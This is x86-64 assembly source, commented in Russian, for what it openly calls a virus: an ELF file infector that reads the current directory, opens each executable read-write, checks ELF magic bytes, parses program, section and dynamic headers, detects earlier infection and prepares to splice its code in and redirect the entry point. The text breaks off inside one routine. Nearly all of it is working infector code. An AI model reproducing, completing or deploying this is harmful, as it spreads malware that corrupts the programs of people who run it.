.text 0

    .global	_start
    .type	_start, @function

_start:
    leaq    _start_infector(%rip), %rsi
    jmp     *%rsi

/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод

    .set DEBUG_MODE, 1

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                  jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

/// печать сообщения об ошибке и выход
/// из программы
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp    _restore_registers_and_stack


.set WRITE_SYSCALL, 0x1
.set OPEN_SYSCALL, 0x2
.set CLOSE_SYSCALL, 0x3
.set STAT_SYSCALL, 0x4
.set MPROTECT_SYSCALL, 0xA
.set PWRITE_SYSCALL, 0x12
.set EXIT_SYSCALL, 0x3C
.set GETDENTS_SYSCALL, 0x4E

.set ELF_E_ENTRY, 0x18
.set ELF_E_PHOFF, 0x20
.set ELF_E_SHOFF, 0x28
.set ELF_E_PHNUM, 0x38
.set ELF_E_SHNUM, 0x3c


.set O_RDONLY, 0x0
.set O_RDWR, 0x2
.set MAP_PRIVATE, 0x2
.set PROT_NONE, 0x0
.set PROT_READ, 0x1
.set PROT_WRITE, 0x2
.set PROT_EXEC, 0x4
.set PROT_READ_OR_PROT_WRITE, 0x3
.set O_RDWR_AND_O_APPEND, 0x402

    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30

.set SHDR_SH_ADDR, 0x10
.set SHDR_SH_TYPE, 0x4
.set SHDR_SH_OFFSET, 0x18
.set SHDR_SH_SIZE, 0x20

.set FIRST_SEGM_VADDR, 0xB
.set OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN, 0x13
.set FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY, 0x1b
.set VICTIM_CODE_OFFSET, 0x23
.set NEW_BIND_NOW_FLAG_RECORD_SIZE, 0x2b
.set DYNAMIC_REC_VADDR, 0x33
.set DYNAMIC_REC_SZ, 0x3b
.set DYNAMIC_RECORDS_OFFSET, 0x43
_msg_infection_success:
    .ascii " is successfully infected \n"

_msg_cur_infection:
    .ascii " file: infection try \n"

new_elf_file:
    .string "test_inf"

dir_name:
    .string "./"

mprotect_ok:
    .quad -1

parse_success:
    .quad -1

recount_success:
    .quad -1

get_virus_success:
    .quad -1

old_rsp:
    .quad 0     # вершина стека жертвы

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

_stack_top:
    .space 6000, 0

_stack_bottom:
    .quad 0

data_size:
    .quad 0x50

constant_value:
    .quad 0x38

clear_from:
    .quad 0

stripped_mode:
    .quad 0
fd:
    .quad 0

interm_fd_file:
    .quad 0

file_offset:
    .quad 0

cur_filename:
    .quad 0

cur_vaddr:
    .quad 0

cur_offset:
    .quad 0

dir_buf:
    .space 8000, 0

dir_struct:
    .space 30, 0

dir_buf_ptr:
    .quad 0

file_name_ptr:
    .quad 0

string_length:
    .quad 0

victim_elf_addr:
    .quad 0

victim_phdr_table_addr:
    .quad 0

victim_phdr_table_size:
    .quad 0

victim_phdr_amount:
    .quad 0

victim_shdr_table_addr:
    .quad 0

victim_shdr_table_size:
    .quad 0

victim_shdr_amount:
    .quad 0

virus_new_vaddr:
    .quad 0

virus_new_phdr:
    .space 0x38, 0

virus_new_shdr:
    .space 0x40, 0

bind_now_flag_record:
    .space 0x10, 0

last_seg_vaddr:
    .quad 0

last_seg_allign:
    .quad 0

last_seg_memsz:
    .quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_bind_now_size:
    .quad 0

victim_code_after_bind_now_size:
    .quad 0

victim_code_before_bind_now_addr:
    .quad 0

victim_code_after_bind_now_addr:
    .quad 0

virus_code_addr:
    .quad 0

virus_code_size:
    .quad 0

strtab_section_vaddr:
    .quad 0

symtab_section_vaddr:
    .quad 0

symtab_section_addr:
    .quad 0

symtab_record_size:
    .quad 0

symtab_records_amount:
    .quad 0

rela_table_vaddr:
    .quad 0

rela_table_addr:
    .quad 0

rela_table_size:
    .quad 0

rela_record_size:
    .quad 0

rela_records_amount:
    .quad 0

jmprela_table_vaddr:
    .quad 0

jmprela_table_addr:
    .quad 0

jmprela_table_size:
    .quad 0

jmprela_record_size:
    .quad 0

jmprela_records_amount:
    .quad 0

dynamic_records_offset:
    .quad 0

dynamic_records_size:
    .quad 0

dynamic_records_vaddr:
    .quad 0

dynamic_records_addr:
    .quad 0

new_bind_now_flag_record_size:
    .quad 0

new_bind_now_record_frm_dynamic_offset:
    .quad 0

original_e_entry:
    .quad 0

offset_to_e_entry:
    .quad 0

move_victim_offset:
    .quad 0

offset_to_e_entry_frm_file_begin:
    .quad 0

frm_orig_e_entry_to_virus_e_entry_offset:
    .quad 0

offset_to_vict_code_frm_file_begin:
    .quad 0

sh_name_indx:
    .long 0

first_seg_vaddr:
    .quad 0

first_seg_addr:
    .quad 0

GOT_vaddr:
    .quad 0

GOT_size:
    .quad 0

GOT_addr_in_memory:
    .quad 0

rela_section_offset:
    .quad 0

rela_section_size:
    .quad 0

data_block:
    .space 0x50, 0

cur_seg_addr:
    .quad 0

cur_seg_end_addr:
    .quad 0

cur_seg_hdr_ptr:
    .quad 0

cur_seg_memsz:
    .quad 0

file_sz:
    .quad 0

clear_to:
    .quad 0

/// Печатает имя файла,
  /// который пытается заразить вирус в
  /// данный момент
  _print_infection_log:
      push     %rsi
      push     %rdi
      push     %rdx

      mov      file_name_ptr(%rip), %rsi
      test     %rsi, %rsi
      je       _print_infection_log_fail

      mov      file_name_ptr(%rip), %rdi
      call     _my_strlen

      mov      string_length(%rip), %rdx
      test     %rdx, %rdx
      je       _print_infection_log_fail

      call    _my_write

      lea     _msg_cur_infection(%rip), %rsi
      mov     $0x16, %rdx
      call    _my_write

      xor     %rax, %rax
      jmp     _print_infection_log_exit
  _print_infection_log_fail:
      mov     $-1, %rax

  _print_infection_log_exit:
      pop     %rdx
      pop     %rdi
      pop     %rsi
      ret
/// _PRINT_SUCCESS_INFECTION_MSG
/// Печатает вывод об успешном инфицировании файла
_print_success_infection_msg:
    push     %rsi
    push     %rdi
    push     %rdx

    mov      file_name_ptr(%rip), %rsi
    test     %rsi, %rsi
    je       _print_success_infection_msg_fail

    mov      file_name_ptr(%rip), %rdi
    call     _my_strlen

    mov      string_length(%rip), %rdx
    test     %rdx, %rdx
    je       _print_infection_log_fail

    call    _my_write

    lea     _msg_infection_success(%rip), %rsi
    mov     $0x1b, %rdx
    call    _my_write

    xor     %rax, %rax
    jmp     _print_success_infection_msg_exit

_print_success_infection_msg_fail:
    mov     $-1, %rax

_print_success_infection_msg_exit:
    pop     %rdx
    pop     %rdi
    pop     %rsi
    ret

/// Разрешает коду вируса писать
/// в самого себя
_allow_write_into_code:
    push    %rdx
    push    %rdi
    push    %rsi

    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    mov     $0x7, %rdx          # RW+EXEC flags - $RDX
    mov     $MPROTECT_SYSCALL, %rax   # mprotect handle
    syscall

    test    %rax, %rax
    jne     _allow_write_into_code_error

    mov     %rax, mprotect_ok(%rip)
_allow_write_into_code_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    ret

    ERR_MSG _allow_write_into_code "mprotect in _start"

/// Очищает все переменные,
/// занося в них значения "по умолчанию"
_clear_old_data:
    push    %rbx
    leaq    clear_from(%rip), %rax
    leaq    clear_to(%rip), %rbx

    mov     %rbx, clear_to(%rip)
    mov     %rax, clear_from(%rip)

    call    _clear_array

    movq    $-1, parse_success(%rip)
    movq    $-1, get_virus_success(%rip)
    movq    $-1, recount_success(%rip)

    xor     %rax, %rax
    jmp     _clear_old_data_exit

_clear_old_data_fail:
    mov     $-1, %rax

_clear_old_data_exit:
    pop    %rbx
    ret

/// _CLEAR_ARRAY
/// Заполняет все нулями
/// с точки from до точки to
_clear_array:
    push    %rcx

    mov     clear_from(%rip), %rax
    test    %rax, %rax
    je      _clear_array_fail

    mov     clear_to(%rip), %rcx
    test    %rcx, %rcx
    je      _clear_array_fail

    sub     %rax, %rcx
_clear_array_cycle:
    movb    $0x0, (%rax)
    inc     %rax
    loop    _clear_array_cycle

_clear_array_success:
    xor     %rax, %rax
    jmp     _clear_array_exit

_clear_array_fail:
    mov     $-1, %rax

_clear_array_exit:
    pop     %rcx
    ret

/// Открывает директорию
/// и считывает все ее записи в буфер
_my_readdir:
    push    %rdi
    push    %rsi
    push    %rbx

    // открыть директорию
    lea     dir_name(%rip), %rdi
    mov     $0x0, %rsi
    mov     $OPEN_SYSCALL, %rax  # fopen syscall
    syscall
    test     %rax, %rax
    jl      _my_readdir_open_error

    // заполянем структуру потока
    lea     dir_struct(%rip), %rbx
    mov     %eax, (%rbx)
    movq    $0x8000, 0x8(%rbx) # размер буфера


    // параметры getdents
    mov     (%rbx), %rdi
    lea     dir_buf(%rip), %rsi
    mov     8(%rbx), %rdx

    // вызов getdents
    mov    $GETDENTS_SYSCALL, %rax
    syscall

    // в случае успеха возвращ.
    // кол-во считанных байт
    // иначе 0
    cmp     $0x0, %rax
    jle     _my_readdir_read_error

    // сохранили указатель на первую структуру
    // в буфере
    lea     dir_buf_ptr(%rip), %rbx
    mov     %rsi, (%rbx)

    xor     %rax, %rax
    pop     %rbx
    pop     %rsi
    pop     %rdi
    ret

    ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
    ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

/// Проверяет: указатель на текущую запись
/// Успех: заполняет cur_filename указателем на
/// имя и возвращает 0 в rax
/// Фейл: заполняет cur_filename нулем и
/// возвращает -1 в rax
_get_file_name:
    push    %rbx
    push    %rcx

    // указатель не нулевой?
    mov     dir_buf_ptr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_file_name_fail

    // получили имя
    lea     0x12(%rbx), %rax
    mov     (%rax), %rcx
    test    %rcx, %rcx
    je      _get_file_name_fail

    mov     %rax, file_name_ptr(%rip)

    xor     %rcx, %rcx
    // получили размер текущей структуры
    // (он меняется)
    movzwl  0x10(%rbx), %ecx
    // сдвинули указатель на
    // следующую структуру
    add     %rcx, %rbx

    mov     %rbx, dir_buf_ptr(%rip)
    xor     %rax, %rax
    jmp    _get_file_name_exit

_get_file_name_fail:
    mov     $-1, %rax
    movq    $0x0, file_name_ptr(%rip)

_get_file_name_exit:
    pop     %rcx
    pop     %rbx
    ret

    ERR_MSG _get_file_name "get_file_name: No files in directory any more"


/// _MY_STRLEN
/// PARAMS -
/// RDI - указатель на строку
/// Изменяет STRING_LENGTH
_my_strlen:
    xor     %rax, %rax

    push    %rcx
    push    %rbx

    test    %rdi, %rdi
    je      _my_strlen_fail

    mov     $0x64, %rcx
    repne   scasb

    mov     $0x64, %rbx
    sub     %rcx, %rbx
    mov     %rbx, %rax
    dec     %rax

    mov     %rax, string_length(%rip)
    xor     %rax, %rax

    jmp    _my_strlen_exit

_my_strlen_fail:
    mov     $-1, %rax

_my_strlen_exit:
    pop     %rbx
    pop     %rcx

    ret

    ERR_MSG _my_strlen "_my_strlen: NULL pointer"


/// WRITE TO STDOUT
/// @PARAMS
///   - %RSI - msg pointer
///   - %RDX - msg size
_my_write:
    mov      $WRITE_SYSCALL, %rax          # write
    mov      $0x1, %rdi    # to stdout
    syscall
    ret

/// _MY_MEMCPY_WITHOUT_BIND_NOW
/// Переписывает код с одного адреса
/// в другой
_my_memcpy_without_bind_now_without_bind_now:
    pushq    %rcx
    pushq    %rdx
    pushq    %rdi
    pushq    %rsi

    mov     cur_seg_memsz(%rip), %rcx
    test    %rcx, %rcx
    je      _my_memcpy_without_bind_now_fail

    mov     cur_seg_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _my_memcpy_without_bind_now_fail

    mov     %rsi, %rdi
    sub     $0x38, %rdi

_cycle_my_memcpy_without_bind_now1:

    movb    (%rsi), %dl
    movb    %dl, (%rdi)

    inc     %rsi
    inc     %rdi

    loop    _cycle_my_memcpy_without_bind_now1
    jmp     _my_memcpy_without_bind_now_success

_my_memcpy_without_bind_now_success:
    xor     %rax, %rax
    jmp     _my_memcpy_without_bind_now_exit

_my_memcpy_without_bind_now_fail:
    mov     $-1, %rax

_my_memcpy_without_bind_now_exit:
    popq    %rsi
    popq    %rdi
    popq    %rdx
    popq    %rcx
    ret

/// _MY_MEMCPY
/// Переписывает код с одного адреса
/// в другой
_my_memcpy:
    pushq    %rcx
    pushq    %rdx
    pushq    %rdi
    pushq    %rsi

    mov     cur_seg_memsz(%rip), %rcx
    test    %rcx, %rcx
    je      _my_memcpy_fail

    mov     cur_seg_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _my_memcpy_fail

    mov     %rsi, %rdi
    sub     $0x38, %rdi

    mov     dynamic_records_addr(%rip), %rax

_cycle_my_memcpy:

    // этот цикл работает, пока мы
    // перемещаем все до секции dynamic
    movb    (%rsi), %dl
    cmp     %rax, %rsi
    // как только мы на нее наткнулись
    // пропускаем ее
    je      _scip_dynamic
    movb    %dl, (%rdi)
    
    inc     %rsi
    inc     %rdi
    
    loop    _cycle_my_memcpy
    jmp     _my_memcpy_success
    

    // пропускаем секцию dynamic -
    // не редактируем ее
_scip_dynamic:

    mov     dynamic_records_size(%rip), %rdx
    
    // сдвинуть указатели на конец
    // секции dynamic
    add     %rdx, %rdi
    add     %rdx, %rsi
    
    // уменьшить количество итераций
    sub     %rdx, %rcx
    
    // сдвинуть dest так, чтоб
    // запись BIND_NOW, если она есть
    // была затерта
    mov     new_bind_now_flag_record_size(%rip), %rdx
    sub     %rdx, %rdi
    

    jmp     _cycle_my_memcpy
_my_memcpy_success:
    xor     %rax, %rax
    jmp     _my_memcpy_exit

_my_memcpy_fail:
    mov     $-1, %rax

_my_memcpy_exit:
    popq    %rsi
    popq    %rdi
    popq    %rdx
    popq    %rcx
    ret


/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
/// или отричательное значение
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $OPEN_SYSCALL, %rax  # fopen syscall
    syscall
    test    %rax, %rax

    jl      _openfile_exit

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    # сохранить дескриптор жертвы
    mov     %rax, fd(%rip)

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    // mov     -0x70(%rbp), %rsi   # filesz
    mov     -0xA0(%rbp), %rsi   # filesz
    mov     %rsi, file_sz(%rip)
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:

    // mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    mov     $PROT_READ_OR_PROT_WRITE, %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
    ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
/// @ RETURN VALUE
/// * RAX - указатель на файл в памяти или отриц. заначени
_my_mmap:
    push %rbx
    push %rcx
    push %rdx
    push %rbp
    push %r10

    mov %r9, %r15
    mov %rsi, %r13
    mov %rdi, %r12
    mov %ecx, %r14d

    movslq %r8d, %rbp
    movslq %edx, %rbx
    movslq %r14d, %r10
    mov $0x9, %eax

    syscall

    pop %r10
    pop %rbp
    pop %rdx
    pop %rcx
    pop %rbx
    ret


/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $STAT_SYSCALL, %rax
    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
    ret

    ERR_MSG _my_stat "my_stat"

/// Открывает файл и сохраняет его
/// адрес
_get_victim_addr:
    push    %rdi
    push    %rsi

    mov     file_name_ptr(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile

    cmp     $0x0,  %rax
    jl      _get_victim_addr_fail

    mov     %rax, victim_elf_addr(%rip)
    xor     %rax, %rax
    jmp     _get_victim_addr_exit

_get_victim_addr_fail:
    mov     $-1, %rax

_get_victim_addr_exit:
    pop    %rsi
    pop    %rdi
    ret

/// IS_IT_ELF
/// PARAMS
/// Проверяет наличие магических байт в
/// загруженном эльфе
/// Если магические байты есть, то
/// возвращает 1 в RAX
/// В противном случае - 0
    magic_bytes_example:
        .quad 0x10102464c457f
    

_is_it_elf:
    push    %rdx
    push    %rbx
    push    %rsi
    push    %rcx

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _is_it_elf_fail

    movq    (%rbx), %rdx
    mov     magic_bytes_example(%rip), %rsi

    cmp     %rsi, %rdx
    jne     _is_it_elf_fail

    xor     %rax, %rax
    jmp     _is_it_elf_exit

_is_it_elf_fail:
    mov     $-1, %rax

_is_it_elf_exit:
    pop     %rcx
    pop     %rsi
    pop     %rbx
    pop     %rdx
    ret


/// получает данные о заголовках сегментов
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_phdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_phdrs_info_fail

    mov     %rdi, %rsi
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_phdr_table_addr(%rip)

    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_phdr_amount(%rip)

    mov     $0x38, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_phdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_phdrs_info_exit

_get_phdrs_info_fail:
    mov     $-1, %rax

_get_phdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret


/// получает данные о заголовках секций
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_shdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_shdrs_info_fail
    mov     %rdi, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    test    %rcx, %rcx
    je      _get_shdrs_info_stripped

    add     %rcx, %rsi
    mov     %rsi, victim_shdr_table_addr(%rip)

    mov     ELF_E_SHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_shdr_amount(%rip)

    mov     $0x40, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_shdr_table_size(%rip)

    jmp     _get_shdrs_info_success

_get_shdrs_info_stripped:
    movq    $0x1, stripped_mode(%rip)

_get_shdrs_info_success:
    xor     %rax, %rax
    jmp     _get_shdrs_info_exit

_get_shdrs_info_fail:
    mov     $-1, %rax

_get_shdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret

_check_file_infection:
    push    %rbx
    push    %rcx
    push    %rdi
    push    %rsi

    mov     victim_elf_addr(%rip), %rax
    test    %rax, %rax
    je     _check_file_infection_fail

    mov     ELF_E_ENTRY(%rax), %rbx
    mov     %rbx, cur_vaddr(%rip)
    call    _count_offset_frm_vaddr
    test    %rax, %rax
    jne     _check_file_infection_fail
    
    mov     victim_elf_addr(%rip), %rax
    mov     cur_offset(%rip), %rbx
    add     %rax, %rbx

    lea     _start(%rip), %rax
    mov     $0x4, %rcx

_check_infection_cycle:
    mov     (%rax), %rdi
    mov     (%rbx), %rsi
    
    cmp     %rdi, %rsi
    jne     _check_file_infection_success
    
    add     $0x8, %rax
    add     $0x8, %rbx
    
    loop    _check_infection_cycle
    jmp     _check_file_infection_fail

_check_file_infection_success:
    xor     %rax, %rax
    jmp     _check_file_infection_exit

_check_file_infection_fail:
    mov     $-1, %rax

_check_file_infection_exit:
    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rbx
    ret

/// Ищет и заполняет данные о
/// первом сегменте кода эльфа
_find_first_seg_vaddr:
    push    %rcx
    push    %r8

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_first_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_first_seg_vaddr_fail

    mov     %r8, %rdi

_find_first_seg_vaddr_cycle:
    cmp     $0x1, (%rdi)
    jne     _find_first_seg_vaddr_next

    cmp     $0x1, (%r8)
    jne     _set_first_seg

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jl      _set_first_seg
    jmp     _find_first_seg_vaddr_next

_set_first_seg:
    mov     %rdi, %r8

_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rdi
    mov     %rdi, (%rsi)

    leaq    first_seg_addr(%rip), %rsi
    mov     %r8, (%rsi)

    xor     %rax, %rax
    jmp    _find_first_seg_vaddr_exit

_find_first_seg_vaddr_fail:
    mov     $-1, %rax

_find_first_seg_vaddr_exit:
    pop     %r8
    pop     %rcx
    ret

  /// _FIND_LAST_SEG_VADDR
/// Ищет виртуальный адрес последнего сегмента кода
_find_last_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_last_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_last_seg_vaddr_fail

    mov     %r8, %rdi
_find_last_seg_vaddr_cycle:

    cmp     $1, (%rdi)
    jne     _find_last_seg_vaddr_next

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jg      _set_last_seg
    jmp     _find_last_seg_vaddr_next

_set_last_seg:
    mov     %rdi, %r8

_find_last_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_last_seg_vaddr_cycle

_find_last_seg_vaddr_success:
    leaq    last_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rax
    mov     %rax, (%rsi)

    mov     PHDR_P_ALLIGN(%r8), %rcx
    leaq    last_seg_allign(%rip), %rsi
    mov     %rcx, (%rsi)

    mov     PHDR_P_MEMSZ(%r8), %rcx
    leaq    last_seg_memsz(%rip), %rsi
    mov     %rcx, (%rsi)

    xor     %rax, %rax
    jmp     _find_last_seg_vaddr_exit

_find_last_seg_vaddr_fail:
    mov     $-1, %rax

_find_last_seg_vaddr_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    ret

/// _FIND_DYNAMIC_SEGMENT
/// Ищет заголовок секции dynamic
/// Если находит, то заполняет данные о секции
_find_dynamic_segment:
    push    %rcx
    push    %rdx
    push    %rdi

    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rcx

    test   %rdi, %rdi
    je      _find_dynamic_segment_fail

    test   %rcx, %rcx
    je     _find_dynamic_segment_fail

_find_dynamic_segment_cycle:
    mov     (%rdi), %rdx
    cmp     $0x2, %dl   # phdr = dynamic?
    je      _find_dynamic_segment_success
    
    add     $0x38, %rdi
    loop    _find_dynamic_segment_cycle
    jmp     _find_dynamic_segment_fail

_find_dynamic_segment_success:
    mov     PHDR_P_VADDR(%rdi), %rdx
    mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr
    
    mov     PHDR_P_OFFSET(%rdi), %rdx
    mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset
    
    mov     victim_elf_addr(%rip), %rcx
    add     %rdx, %rcx
    mov     %rcx, dynamic_records_addr(%rip)
    
    mov     PHDR_P_FILESZ(%rdi), %rdx
    mov     %rdx, dynamic_records_size(%rip)   # dynamic size
    

    xor     %rax, %rax
    jmp     _find_dynamic_segment_exit

_find_dynamic_segment_fail:
    mov     $-1, %rax

_find_dynamic_segment_exit:
    pop     %rdi
    pop     %rdx
    pop     %rcx
    ret

_find_bind_now_record:
    push    %rdx
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov     dynamic_records_size(%rip),%rax
    test    %rax, %rax
    je      _find_bind_now_record_fail

    // адрес секции dynamic в памяти
    mov    dynamic_records_addr(%rip), %rdi
    mov     %rdi, %r8

    // установили счетчик цикла
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

_find_bind_now_record_cycle:
    // запсиь BIND_NOW?
    cmpq    $0x18, (%rdi)
    je      _bind_now_record_exist

    // запись NULL?
    cmp     $0x0, (%rdi)
    // запись NULL всегда последняя,
    // так что дальше проверять не имеет смысла
    je      _no_bind_now_record_exist

    add     $0x10, %rdi
    loop    _find_bind_now_record_cycle

    jmp     _no_bind_now_record_exist

_bind_now_record_exist:
    //  обнуили размер новой записи - ее же не будет
    movb    $0x0, new_bind_now_flag_record_size(%rip)
    xor     %rax, %rax

    jmp     _find_bind_now_record_exit

    // записи BIND_NOW нет - придется позже генерировать новую
_no_bind_now_record_exist:
    movb    $0x10, new_bind_now_flag_record_size(%rip)

    // посчитали смещение от начала секции dynamic
    // до места, куда будем вписывать новую запись
    sub     %r8, %rdi
    mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

    xor     %rax, %rax
    jmp     _find_bind_now_record_exit

_find_bind_now_record_fail:
    mov     $-1, %rax

_find_bind_now_record_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    pop     %rdx
    ret



/// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
/// Высчитывает адрес и размер всего кода жертвы,
/// если мы не генерируем запись BIND_NOW
_get_victim_whole_code_addr_and_size:
    push    %rcx
    push    %rdx

    // проверяем наличие всех необходимых данных
    // мы генерируем новыую запись BIND_NOW?
    // если да, то этот метод вычисления размера и адреса
    // кода жертвы нам не подходит
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    jne     _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_whole_code_addr_and_size_fail

    // вычисляем размер и адрес кода жертвы
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)
    
    // считаем адрес кода жертвы
    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx
    mov     %rcx, victim_code_addr(%rip)

    mov     stripped_mode(%rip), %rdx
    test    %rdx, %rdx
    je     _count_whole_code_for_unstripped_victim

_count_whole_code_for_stripped_victim:
    mov     file_sz(%rip), %rdx
    mov     victim_code_offset(%rip), %rcx
    sub     %rcx, %rdx
    mov     %rdx, victim_code_size(%rip)

    jmp     _get_victim_whole_code_addr_and_size_success

_count_whole_code_for_unstripped_victim:

   // считаем  размер кода жертвы
   mov     victim_shdr_table_addr(%rip), %rdx
   sub     %rcx, %rdx
   mov     %rdx, victim_code_size(%rip)

_get_victim_whole_code_addr_and_size_success:
    xor     %rax, %rax
    jmp     _get_victim_whole_code_addr_and_size_exit

_get_victim_whole_code_addr_and_size_fail:
    mov     $-1, %rax

